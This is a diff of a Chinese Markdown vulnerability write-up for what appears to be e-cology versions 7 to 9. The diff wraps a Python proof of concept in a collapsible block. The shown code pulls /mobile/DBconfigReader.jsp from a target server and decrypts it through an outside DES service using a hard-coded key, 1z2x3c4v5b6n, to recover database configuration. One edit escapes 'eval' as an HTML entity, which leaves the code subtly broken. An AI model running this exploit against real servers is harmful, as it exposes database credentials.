@@ -23,8 +23,10 @@ tags:
 
 ```
 目前已知为8.100.0531,不排除其他版本，包括不限于EC7.0、EC8.0、EC9.0版
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞复现
 
 根据源码可以得到DES密钥为 1z2x3c4v5b6n（也有1z2x3c4v的,可以按此规律来爆破）
@@ -68,13 +70,14 @@ def req(url):
 	}
 	u = 'http://tool.chacuo.net/cryptdes'
 	r2 = requests.post(u,data=postdata,headers=headers).content	
-	res2 = ast.literal_eval(r2)
+	res2 = ast.literal_&#101;val(r2)
 	
 	return res2['data']
 
 url = 'http://xxx.xxx.xxx.xxx:8888//mobile/DBconfigReader.jsp'
-print req(url)
-```
+print req(url)</code></pre>
+
+</details>
 
 
 
